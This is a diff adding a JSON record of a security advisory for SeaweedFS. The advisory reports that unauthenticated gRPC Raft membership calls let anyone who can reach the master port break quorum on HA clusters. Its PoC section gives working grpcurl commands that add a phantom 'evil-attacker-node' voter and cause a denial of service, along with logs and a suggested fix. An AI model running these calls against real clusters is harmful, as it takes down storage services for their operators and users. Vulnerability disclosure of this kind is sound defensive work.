@@ -1,0 +1,46 @@
+{
+  "global": null,
+  "id": "GHSA-h249-8wvq-pc5v",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.2,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-306"
+    ],
+    "description": "### Summary\nAn unauthenticated attacker who can reach a SeaweedFS master gRPC port can add a fake, unreachable node to the live Raft cluster and take down the write path of the whole cluster. The master exposes RaftAddServer, RaftRemoveServer, and RaftLeadershipTransfer over gRPC with no caller authentication or authorization check of any kind. On a cluster running the documented multi master HA configuration, the hashicorp raft backend, a single unauthenticated RaftAddServer call inserted a phantom voter the real master could never reach. Within seconds the master lost Raft leadership, and every subsequent Assign call, the RPC that filers, the S3 gateway, and every client use to get a write location, started failing.\n\n### Details\nweed/server/master_grpc_server_raft.go implements RaftAddServer, RaftRemoveServer, and RaftLeadershipTransfer. None of the three call any authentication function. The only guard present is a raft leadership check, which does not verify caller identity at all.\n\n```go\n// weed/server/master_grpc_server_raft.go:62\nfunc (ms *MasterServer) RaftAddServer(ctx context.Context, req *master_pb.RaftAddServerRequest) (*master_pb.RaftAddServerResponse, error) {\n    ...\n    if ms.Topo.HashicorpRaft.State() != raft.Leader {\n        return nil, fmt.Errorf(\"raft add server %s failed: %s is no current leader\", req.Id, ...)\n    }\n    idxFuture = ms.Topo.HashicorpRaft.AddVoter(raft.ServerID(req.Id), raft.ServerAddress(req.Address), 0, 0)\n```\n\ngRPC server reflection is also enabled by default on the master port, so the full RPC surface, including these raft management calls, is discoverable with zero credentials before an attacker even needs to know the method names.\n\nRaftRemoveServer, at line 89 of the same file, has the identical shape. Only the leadership check gates it, so an attacker who knows or guesses a real peer id could evict a legitimate voter with the same lack of auth. This was confirmed by static review, not separately fire tested.\n\nIn the default single master deployment the master runs the legacy raft backend and ms.Topo.HashicorpRaft is nil, so these three RPCs return an empty response and do nothing. The vulnerability only manifests when the operator runs the hashicorp raft backend, -master.raftHashicorp=true, which is what the SeaweedFS documentation recommends for any multi master or highly available deployment. The deployments that most need continuous availability are exactly the ones exposed.\n\n### PoC\nBuilt seaweedfs from the main branch and started a master with the documented HA bootstrap flags:\n```\nweed server -dir=<datadir> -ip=127.0.0.1 -master.port=9333 -volume.port=8080 -filer=false -s3=false -master.raftHashicorp=true -master.raftBootstrap=true\n```\nControl call, confirms the cluster is healthy with one real voter:\n```\n$ grpcurl -plaintext -d '{}' 127.0.0.1:19333 master_pb.Seaweed/RaftListClusterServers\n{\"clusterServers\":[{\"id\":\"127.0.0.1:9333\",\"address\":\"127.0.0.1:19333\",\"suffrage\":\"Voter\",\"isLeader\":true}]}\n```\nAttack call, zero credentials, no TLS, no token:\n```\n$ grpcurl -plaintext -d '{\"id\":\"evil-attacker-node\",\"address\":\"10.13.37.66:19333\",\"voter\":true}' 127.0.0.1:19333 master_pb.Seaweed/RaftAddServer\n{}\n```\nVerification, the fake voter is now a permanent member of the raft configuration:\n```\n$ grpcurl -plaintext -d '{}' 127.0.0.1:19333 master_pb.Seaweed/RaftListClusterServers\n{\"clusterServers\":[{\"id\":\"127.0.0.1:9333\",\"isLeader\":true},{\"id\":\"evil-attacker-node\",\"address\":\"10.13.37.66:19333\",\"suffrage\":\"Voter\"}]}\n```\nMaster log immediately after the call, showing loss of quorum and leadership:\n```\nraft: failed to make requestVote RPC: target=\"{Voter evil-attacker-node 10.13.37.66:19333}\" error=\"...i/o timeout...\" term=3\nraft: failed to heartbeat to: peer=10.13.37.66:19333 ...\nis leader false change event: 127.0.0.1:9333.19333 =>\n```\nCluster impact check, the master can no longer serve the RPC every client depends on:\n```\n$ grpcurl -plaintext -d '{\"count\":1}' 127.0.0.1:19333 master_pb.Seaweed/Assign\nERROR: Code: Unknown  Message: raft.Server: Not current leader\n```\n\nSuggested fix: Add a caller authentication and authorization check to RaftAddServer, RaftRemoveServer, and RaftLeadershipTransfer before any raft mutation is attempted, following the same pattern already used for other admin gRPC calls in this codebase, for example checkGrpcAdminAuth. At minimum require the shared cluster gRPC token that master to master and master to volume RPCs already support, or restrict raft membership RPCs to mTLS client certificates signed by the cluster CA. Reject unauthenticated callers before touching ms.Topo.HashicorpRaft, not after.\n\n### Impact\nAny network client that can reach the master gRPC port, 19333 by default and plaintext unless the operator explicitly configures grpc.master.cert and grpc.master.key, can add unreachable phantom voters and break raft quorum on any multi master or HA deployment. This is a full denial of service of the cluster write path from a single unauthenticated call, no credentials needed. Repeating the call with several phantom voters against a larger cluster makes quorum recovery progressively harder without manual raft configuration surgery. RaftRemoveServer carries the same missing check and would let an attacker evict a real voter outright, confirmed by code review only. The default single master, legacy raft deployment only accepts and silently no-ops the calls, it is not driven into a broken quorum state by this issue.",
+    "ghsa_id": "GHSA-h249-8wvq-pc5v",
+    "html_url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-h249-8wvq-pc5v",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-h249-8wvq-pc5v"
+      }
+    ],
+    "published_at": "2026-09-18T19:58:48Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Unauthenticated Raft cluster membership manipulation causes master denial of service",
+    "updated_at": "2026-09-18T19:58:48Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "seaweedfs"
+        },
+        "patched_versions": null,
+        "vulnerable_version_range": "<= 3.97"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "seaweedfs/seaweedfs"
+}
